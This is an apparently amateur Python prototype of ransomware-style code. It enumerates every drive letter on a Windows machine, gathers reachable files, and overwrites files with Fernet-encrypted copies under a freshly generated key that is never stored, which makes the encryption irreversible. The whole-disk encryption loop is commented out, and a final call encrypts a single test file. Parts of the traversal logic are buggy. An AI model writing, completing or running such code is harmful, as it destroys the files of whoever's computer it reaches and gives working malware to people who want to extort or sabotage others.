from cryptography.fernet import Fernet
import random
import string
import os
import sys

def key_generator():
    '''Generate a 128 character Key'''
    char = string.ascii_letters + string.digits + string.punctuation
    key = ''.join(random.choice(char) for i in range(128))
    print(key)


def get_all_accessible_files_in_Dir(init_path = str):
    '''find all the folder it can
    :param:return: return all the folder it could find
    '''
    files = []
    try:
        for path in os.listdir(init_path):
            if os.path.isfile(os.path.join(init_path,path)):
                files.append(init_path + path)
    except:
        print(f'invalide root {init_path}')


    return files

def get_all_accessible_folder_in_dir(init_path = str):
    '''
    :param init_path: where to look in directory
    :return: all the directorys in there
    '''
    folders = []
    try:
        for path in os.listdir(init_path):
            if os.path.isdir(init_path):
                folders.append(init_path+path)
    except:
        print(f'no access to folder : {init_path}')
    return folders

def get_all_accessible():
    ''''
    find all the directorys in the computer
    '''
    possible_Init = string.ascii_uppercase
    directorys = []
    files = []
    ended_directory = []
    for i in possible_Init :
        init_path = f'{i}:\\'

        try:

            directorys.append(init_path)
            directorys =get_all_accessible_folder_in_dir(init_path)
            files = files  + get_all_accessible_files_in_Dir(init_path)
            ended_directory.append(init_path)
            for e in directorys :
                directorys = directorys + get_all_accessible_folder_in_dir(f'{e}\\')
                files = files + get_all_accessible_files_in_Dir(f'{e}\\')
                ended_directory.append(e)
                directorys.remove(e)
            print(f'directorys : {directorys}')
            print(f'files : {files}')
            print(f'ended directorys : {ended_directory}')
        except:
            print('lol')
    final = files
    return final

def encrypt_file(file_path,F_key):
    with open(file_path,'rb') as ef:
        data = ef.read()
    edata = F_key.encrypt(data)
    with open(file_path,'wb') as ef:
        ef.write(edata)


"""def encrypt_file(file_path,F_key):
    print(f'Encrypthing File : {file_path}')
    try:
         with open(file_path,'rb') as ef:
             data = ef.read()
             print('can oppen the data')
    except:
        print(f'can\'t oppen the file {file_path}')"""









cipher = Fernet(Fernet.generate_key())
files = get_all_accessible()
"""for e in files:
    print(encrypt_file(e,cipher))"""

print(f"The folder returned is : {files}")


cipher = Fernet(Fernet.generate_key())
encrypt_file('D:\\projet\\Encrypt_Computer\\Encryption_Howl_Computer\\dev\\test.txt',cipher)
